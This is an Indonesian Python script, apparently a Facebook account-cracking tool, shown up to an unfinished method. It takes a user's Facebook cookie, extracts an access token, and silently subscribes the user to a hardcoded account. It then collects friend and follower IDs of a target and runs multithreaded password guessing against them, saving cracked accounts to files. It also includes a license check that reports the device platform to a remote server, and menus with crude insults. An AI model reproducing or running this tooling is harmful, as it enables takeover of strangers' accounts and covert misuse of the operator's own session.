# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak

import os, sys, subprocess, platform
try:
	import rich
except ImportError:
	print ('\n\t\x1b[0m >_< mohon tunggu... >_<\n')
	os.system('pip install rich')
	
import rich
from rich.markdown import Markdown
from rich.console import Console

try:
	import requests
except ImportError:
	catet_req = ('# • sedang menginstall modul requests •')
	requ = rich.markdown.Markdown(catet_req, style='green')
	rich.console.Console().print(requ)
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	catet_futur = ('# • sedang menginstall modul futures •')
	ft = rich.markdown.Markdown(catet_futur, style='green')
	rich.console.Console().print(ft)
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	catet_bs = ('# • sedang menginstall modul bs4 •')
	soup = rich.markdown.Markdown(catet_bs, style='green')
	rich.console.Console().print(soup)
	os.system('pip install bs4')
try:
	import mechanize
except ImportError:
	catet_mek = ('# • sedang menginstall modul mechanize •')
	meka = rich.markdown.Markdown(catet_mek, style='green')
	rich.console.Console().print(meka)
	os.system('pip install mechanize')
try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
	
Mr = '\x1b[1;91m' 
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m'
 	
# MODULE
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

# TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# KUMPULAN WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="-"
ok, cp, id, user, pwx, loop = [], [], [], [], [], 0

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

# FOLDER
def folder():
	try:os.mkdir('IG')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass

# LOGO (LO GOBLOK)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

author = 'Romi Afrizal'
fb_me = 'facebook.com/romi.afrizal.102'
github = 'github.com/Mark-Zuck'

def logo():
	time.sleep (0.01)
	print ('')
	print ('')
	jalan ('\x1b[1;97m                       _____---____ ')
	jalan ('\x1b[1;97m                    ________---_______ ')
	jalan ('\x1b[1;97m         ___-----           __      ----_ ')
	jalan ('\x1b[1;97m    ---______        ----                 \ ')
	jalan ('\x1b[1;97m                 --__    |             _____) ')
	jalan ('\x1b[1;97m                     -                /     \ ')
	jalan ('\x1b[1;97m          _____-----    ___--         \    /)\ ')
	jalan ('\x1b[1;97m    -----_____      ---____            \__/  / ')
	jalan ('\x1b[1;97m                 --__    \ --    _          /\ ')
	jalan ('\x1b[1;97m                      --__-__     \_____/   \_/\ ')
	jalan ('\x1b[1;97m                            ----|   /          | ')
	jalan ('\x1b[1;96mAuthor \x1b[1;97m : \x1b[1;94mRomi Afrizal\x1b[1;97m          |  |___________| ')
	jalan ('\x1b[1;96mAdmin  \x1b[1;97m : \x1b[1;93mJessica Putri\x1b[1;97m         |  | ((_(_)| )_) ')
	jalan ('\x1b[1;96mGroup\x1b[1;97m   : \x1b[1;92mRATU ERROR            \33[0;1m\x1b[1;97m|  \_((_(_)|/(_) ')
	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\             ( ')
	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\_____________)')
	print

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')

id = []
cp = []
ok = []
loop = 0
    
# CONVERT COOKIE DICT TO STRING
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

# MENU MASUK
def Masuk():
	logo()
	print('')
	print ('\n%s[%s01%s] %sLogin menggunakan cookies '%(O,P,O,P))
	print ('%s[%s02%s] %sCara mendapatkan cookies '%(O,P,O,P))
	print ('%s[%s03%s] %sLihat hasil crack '%(O,P,O,P))
	print ('%s[%s00%s] %sKeluar '%(O,P,O,P))
	rom = input ("\n%s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
	if rom in['']:
		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
	elif rom in['1','01']:
		kukis = input("\n%sMasukan cookie %s: %s"%(P,H,K))
		with requests.Session() as ROMZ:
			try:
				get_tok = ROMZ.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis})
				token = re.search("(EAAG\w+)", get_tok.text).group(1)
				open('data/cookie.txt','w').write(kukis)
				open('data/token.txt','w').write(token)
				requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
				print ("\n%s √ login berhasil "%(H));jeda(2)
				Menu()
			except (KeyError):
				exit ("\n%s× cookie kadaluwarsa "%(M));jeda(2)
			except (IOError):
				exit ("\n%s× login gagal, periksa cookies anda "%(M));jeda(2)
			except (AttributeError):
				exit ("\n%s× terjadi kesalahan "%(M));jeda(2)
			except requests.exceptions.ConnectionError:
				exit ("\n%s%s tidak ada koneksi "%(M,til));jeda(2)
	elif rom in['2','02']:
		os.system("xdg-open https://www.youtube.com/channel/UC-ZVCYSPdDiAKJ0a80GLHiw")
		exit()
	elif rom in['3','03']:
		hasil_fb()
	elif rom in['0','00']:
		jalan ('\n%s%s Sampai jumpa tod...'%(M,til));jeda(2);exit()
	else:
		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		
# MENU PILIHAN INI AJG
hapus = ('rm -rf data/token.txt && rm -rf data/cookie.txt')
def Menu():
	try:
		os.system("clear")
		licensi = open(".licensi","r").read().strip()
		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (licensi.strip(), platform.platform())).json()
		if "error" in gets["status"]:
			exit(" [×] message: "+gets["msg"]+"\n\n")
		elif "berlaku" in gets["status"]:
			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
			os.system("clear")
		elif "kadaluarsa" in gets["status"]:
			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
		else:
			exit("[!] licensi tidak valid")
	except FileNotFoundError:
		activate_licensi()
	folder()
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		nama = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies=coki).json()['name']
	except KeyError:
		print ("\n%s cookie kadaluwarsa "%(M));jeda(2)
		os.system (hapus)
		Masuk()
	except FileNotFoundError:
		os.system (hapus)
		os.system("clear")
		Masuk()
	except requests.exceptions.ConnectionError as konek:
		exit (f"\n%s%s gagal memuat tidak ada koneksi: {konek}"%(M,til));jeda(2)
	banner()
	print('')
	print('')
	print (' %s[%s01%s] %sCrack dari daftar teman '%(O,P,O,P))
	print (' %s[%s02%s] %sCrack dari total pengikut'%(O,P,O,P))
	print (' %s[%s03%s] %sCrack dari reaction post'%(O,P,O,P))
	print (' %s[%s04%s] %sCrack dari komentar post'%(O,P,O,P))
	print (' %s[%s05%s] %sCrack dari anggota group'%(O,P,O,P))
	print (' %s[%s06%s] %sCrack dari pencarian nama'%(O,P,O,P))
	print (' %s[%s07%s] %sCrack dari pesan mesengger'%(O,P,O,P))
	print (' %s[%s08%s] %sCrack dari saran teman'%(O,P,O,P))
	print (' %s[%s09%s] %sLihat hasil crack'%(O,P,O,P))
	print (' %s[%s10%s] %sCheckpoint detektor'%(O,P,O,P))
	print (' %s[%s11%s] %sCek ID'%(O,P,O,P))
	print (' %s[%s12%s] %sSpam limited editon'%(O,P,O,P))
	print (' %s[%srm%s] %sHapus data login'%(O,P,O,P))
	pilih(token,coki)

def activate_licensi():
	os.system("clear")
	print("\n\n\x1b[1;97mSudah mempunyai licensi key? ketik \x1b[1;95madmin\x1b[1;97m untuk chat admin, ketik \x1b[1;92mgets\x1b[1;97m untuk mengambil licensi melalui website RATUERROR\n")
	key = input(" [>] licensi: ").lower()
	if "gets" in key:
		os.system("xdg-open https://fbkey.ratuerror.com/register/")
		activate_licensi()
	elif "admin" in key:
		os.system("xdg-open https://wa.me/6287799183568?text=Jessica%20cantik....beli%20lisensi%20dooong")
		activate_licensi()
	else:
		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
		if "error" in gets["status"]:
			exit(" [×] message: "+gets["msg"]+"\n\n")
		elif "berlaku" in gets["status"]:
			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
			open(".licensi","w").write(key.strip())
			Menu()
			os.system("clear")
		elif "kadaluarsa" in gets["status"]:
			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
		else:
			exit("[!] licensi tidak valid")

def pilih(token,coki):
	slut = input("\n %s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
	if slut in['',' ']:
		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
	elif slut in['1','01']:
		PublikGRAPH(token,coki)
	elif slut in['2','02']:
		FollowGRAPH(token,coki)
	elif slut in['3','03']:
		ComingSoon()
	elif slut in['4','04']:
		ComingSoon()
	elif slut in['5','05']:
		ComingSoon()
	elif slut in['6','06']:
		ComingSoon()
	elif slut in['7','07']:
		ComingSoon()
	elif slut in['8','08']:
		ComingSoon()
	#elif slut in['9','09']:
		#useragent()
	elif slut in['9','09']:
		hasil_fb()
	elif slut in['10']:
		file_cp()
	elif slut in['11']:
		ingfoh()
	elif slut in['rm','RM','Rm']:
		os.system(hapus)
	elif slut in['0','00']:
		exit()
	else:
		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		
def ComingSoon():
	jalan ("\n %sMenu belum tersedia... "%(O));exit()
			
# CRACK PUBLIK 
def PublikGRAPH(token,cookie):
	try:
		print ("\n %sPastikan daftar teman bersifat %sPUBLIK "%(P,H))
		user = input(' %sMasukan %sUsername%s/%sID%s : %s'%(P,H,P,K,P,M))
		po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}<=>{i['name']}")
		#print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
	except KeyError as e:
		exit("\n%s GAGAL %smengambil usename/ID....."%(M,P))
		
	return Crack().romiy(id)

 # CRACK FOLOWERS 
def FollowGRAPH(token,cookie):
	try:
		print ("\n%s%s %sPastikan target terdapat pengikut "%(U,til,O))
		user = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,M))
		po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=subcribers.limit(6000)&access_token={token}",cookies=cookie).json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}<=>{i['name']}")
		#print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
	except KeyError as e:
		exit('\n%s%s gagal mengambil id '%(M,til))
		
	return Crack().romiy(id)
			
# USER AGENT
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
# USER AGENT
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
def uas(_romz_):
	if _romz_ == '':
		print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		uas(_romz_)
	elif _romz_ in("1","01"):
		print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
		print ("%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
		ua = input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
		if ua in(""):
			print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			Menu()
		elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
			jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
			useragent(_romz_)
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2)
			Menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("\n%s%s berhasil mengganti user agent"%(H,til));jeda(2)
		Menu()
	elif _romz_ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s%s%s user agent anda%s : %s%s"%(U,til,O,M,H,ua_));jeda(2)
			input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
			menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif _romz_ in("0","00"):
		Menu()
	else:
		print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		uas(_romz_)
		
# MULAI CRACK 
pwx = []
class Crack:
	
	def __init__(self):
		self.id = []
		self.url = "https://mbasic.facebook.com"
		
	def romiy(self, id):
		self.id = id
		print ('\n%s Jumlah ID : %s%s'%(P,H,len(self.id)))
		unikers = input('\n %s[%s?%s] %sGunakan password manual (%sy%s/%st%s)%s : %s'%(O,P,O,P,H,P,K,P,H,M))
		if unikers in ('Y', 'y'):
			print ('\n%s Contoh :%s sayang%s,%spengen%s,%sngentot'%(P,M,P,K,P,H))
			while True:
				pwx = input('%s Password : %s'%(P,K))
				if pwx == '':
					print ('\n%s%s Jangan kosong '%(M,til))
				elif len(pwx)<=5:
					print ('\n%s%s Password minimal 6 karakter'%(M,til))
					exit()
				else:
					def manual(brute=None):
						ind = input("\n%s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
						if ind =='':
							print("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
							manual()
						elif ind in ('1', '01'):
							print ('\n %s- akun %s[OK] %stersimpan ke file : %sOK/%s.txt'%(P,H,P,H,waktu));jeda(0.2)
							print (' %s- akun %s[CP] %stersimpan ke file : %sOK/%s.txt'%(P,K,P,K,waktu));jeda(0.2)
							jalan ('\n%s setiap crack 1k ID, mainkan mode pesawat %s2 %sdetik \n'%(P,H,P));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.touch, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('2', '02'):
							print ('\n %s- akun %s[OK] %stersimpan ke file : %sOK/%s.txt'%(P,H,P,H,waktu));jeda(0.2)
							print (' %s- akun %s[CP] %stersimpan ke file : %sOK/%s.txt'%(P,K,P,K,waktu));jeda(0.2)
							jalan ('\n%s setiap crack 1k ID, mainkan mode pesawat %s2 %sdetik \n'%(P,H,P));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.basic, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('3', '03'):
							print ('\n %s- akun %s[OK] %stersimpan ke file : %sOK/%s.txt'%(P,H,P,H,waktu));jeda(0.2)
							print (' %s- akun %s[CP] %stersimpan ke file : %sOK/%s.txt'%(P,K,P,K,waktu));jeda(0.2)
							jalan ('\n%s setiap crack 1k ID, mainkan mode pesawat %s2 %sdetik \n'%(P,H,P));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.mobil, _heck_, brute)
									except: pass
							hasil(ok,cp)
						else:
							print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
							manual()
					print ('\n %sPILIH METHODE LOGIN '%(P))
					print ('\n %s[%s1%s] %smethode %sfree %s(fast) '%(O,P,O,P,M,P))
					print (' %s[%s2%s] %smethode %smbasic %s(slow) '%(O,P,O,P,K,P))
					print (' %s[%s3%s] %smethode %smobile %s(very slow) '%(O,P,O,P,H,P))
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			print ('\n %sPILIH METHODE LOGIN '%(P))
			print ('\n %s[%s1%s] %sMethode %sfree %s(fast) '%(O,P,O,P,M,P))
			print (' %s[%s2%s] %sMethode %smbasic %s(slow) '%(O,P,O,P,K,P))
			print (' %s[%s3%s] %sMethode %smobile %s(very slow) '%(O,P,O,P,H,P))
			self.langsung()
		else:
			print("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			Menu()
	
	# LANGSUNG
	def langsung(self):
		global pwx
		#from data import list_peweh
		suuu = input("\n %s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
		if suuu == '':
			print("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			self.langsung()
